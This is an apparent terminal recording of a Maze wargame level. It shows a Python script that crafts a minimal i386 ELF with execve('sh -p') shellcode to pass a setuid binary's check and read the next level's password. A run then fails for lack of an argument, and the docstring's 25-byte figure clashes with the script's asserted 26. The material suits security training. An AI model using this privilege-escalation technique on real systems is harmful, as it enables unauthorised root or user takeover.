[0.003, "o", "\u001b]3008;end=87db53de-edb0-44bd-b96f-359e3849806c;exit=success\u001b\\\u001b]3008;start=be5066c5-cd88-447a-b473-cc78d2839f66;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\\u001b[?2004h\u001b]0;maze4@maze: /run/screen/l4\u0007maze4@maze:/run/screen/l4$ "]
[0.251, "o", "cat tinel.py\r\r\n\u001b[?2004l\r\u001b]3008;start=80e06733-fb65-4129-901e-3ef9622de000;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\#!/usr/bin/env python3\r\r\n\"\"\"Build a <=123-byte i386 ELF that passes maze4's gate and execs dash -p.\r\r\n\r\r\nmaze4 gate (gdb-verified):\r\r\n    product = file[7]*file[8]                 (ELF: EI_OSABI*EI_ABIVERSION = 0*0 = 0)\r\r\n    off     = dword(file[28..31])             (ELF: e_phoff = 52)\r\r\n    compare = dword(file[off+12..off+15])     (ELF: phdr0+12 = p_paddr)\r\r\n    pass if product == compare && st_size <= 123\r\r\n\r\r\n=> phdr0.p_paddr must be 0 (legal, ignored by the kernel).\r\r\n=> budget: 52 (ehdr) + 32 (phdr) + 39 (code+strings) = 123 exactly.\r\r\n\r\r\nStrings \"sh\\0-p\\0\" (6 bytes) hide in e_ident[9..14] (EI_PAD area, kernel ignores).\r\r\nCode (25 bytes) at file offset 84, loaded at 0x08048000+84 = 0x080480b4:\r\r\n    execve(\"sh\", {\"sh\", \"-p\", NULL}, NULL)  -- relative path, dash copy in cwd,\r\r\n    -p keeps euid (maze5). Then `cat /etc/maze_pass/maze5` from that shell.\r\r\n\"\"\"\r\r\nimport struct, sys\r\r\n\r\r\nV = 0x08048000\r\r\nCODE_OFF = 84\r\r\n\r\r\ncode = bytes([\r\r\n    0x31, 0xC0,                         # xor eax, eax\r\r\n    0x50,                               # push eax            (NULL)\r\r\n    0x68, 0x0C, 0x80, 0x04, 0x08,       # push 0x0804800c     (\"-p\" @ V+12)\r\r\n    0x68, 0x09, 0x80, 0x04, 0x08,       # push 0x08048009     (\"sh\" @ V+9)\r\r\n    0x89, 0xE1,                         # mov ecx, esp        (argv)\r\r\n    0xBB, 0x09, 0x80, 0x04, 0x08,       # mov ebx, 0x08048009 (\"sh\" path)\r\r\n    0x31, 0xD2,                         # xor edx, edx        (envp NULL)\r\r\n    0xB0, 0x0B,                         # mov al, 11          (__NR_execve)\r\r\n    0xCD, 0x80,                         # int 0x80\r\r\n])\r\r\nassert len(code) == 26\r\r\n\r\r\nehdr = bytearray(52)\r\r\nehdr[0:8] = b\"\\x7fELF\\x01\\x01\\x01\\x00\"\r\r\nehdr[9:15] = b\"sh\\x00-p\\x00\"                       # strings in EI_PAD\r\r\nehdr[15] = 0\r\r\nstruct.pack_into(\"<HHIIIIIHHHHHH\", ehdr, 16,\r\r\n                 2,          # e_type = ET_EXEC\r\r\n                 3,          # e_machine = EM_386\r\r\n                 1,          # e_version\r\r\n                 V + CODE_OFF,   # e_entry\r\r\n                 52,         # e_phoff  <-- also the gate's lseek offset\r\r\n                 0,          # e_shoff\r\r\n                 0,          # e_flags\r\r\n                 52,         # e_ehsize\r\r\n                 32,         # e_phentsize\r\r\n                 1,          # e_phnum\r\r\n                 0, 0, 0)    # e_shentsize, e_shnum, e_shstrndx\r\r\n\r\r\nphdr = bytearray(32)\r\r\nstruct.pack_into(\"<IIIIIIII\", phdr, 0,\r\r\n                 1,          # p_type = PT_LOAD\r\r\n                 0,          # p_offset\r\r\n                 V,          # p_vaddr\r\r\n                 0,          # p_paddr  <-- MUST be 0 (the gate's compare dword)\r\r\n                 123,        # p_filesz\r\r\n                 123,        # p_memsz\r\r\n                 5,          # p_flags = R|X\r\r\n                 0x1000)     # p_align\r\r\n\r\r\ndata = bytes(ehdr) + bytes(phdr) + code\r\r\ndata += b\"\\x00\" * (123 - len(data))     # pad to exactly 123 (size gate: <= 0x7b)\r\r\nassert len(data) == 123\r\r\nopen(sys.argv[1], \"wb\").write(data)\r\r\nprint(\"wrote\", len(data), \"bytes\")\r\r\n\u001b]3008;end=80e06733-fb65-4129-901e-3ef9622de000;exit=success\u001b\\\u001b]3008;start=be5066c5-cd88-447a-b473-cc78d2839f66;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\\u001b[?2004h\u001b]0;maze4@maze: /run/screen/l4\u0007maze4@maze:/run/screen/l4$ "]
[0.244, "o", "python3 tinel.py\r\r\n\u001b[?2004l\r\u001b]3008;start=b692a6d2-c8f4-4837-8801-66180fcb1624;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\"]
[0.146, "o", "Traceback (most recent call last):\r\r\n  File \u001b[35m\"/run/screen/l4/tinel.py\"\u001b[0m, line \u001b[35m67\u001b[0m, in \u001b[35m<module>\u001b[0m\r\r\n    open(\u001b[31msys.argv\u001b[0m\u001b[1;31m[1]\u001b[0m, \"wb\").write(data)\r\r\n         \u001b[31m~~~~~~~~\u001b[0m\u001b[1;31m^^^\u001b[0m\r\r\n\u001b[1;35mIndexError\u001b[0m: \u001b[35mlist index out of range\u001b[0m\r\r\n\u001b]3008;end=b692a6d2-c8f4-4837-8801-66180fcb1624;exit=failure;status=1\u001b\\\u001b]3008;start=be5066c5-cd88-447a-b473-cc78d2839f66;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\\u001b[?2004h\u001b]0;maze4@maze: /run/screen/l4\u0007maze4@maze:/run/screen/l4$ "]
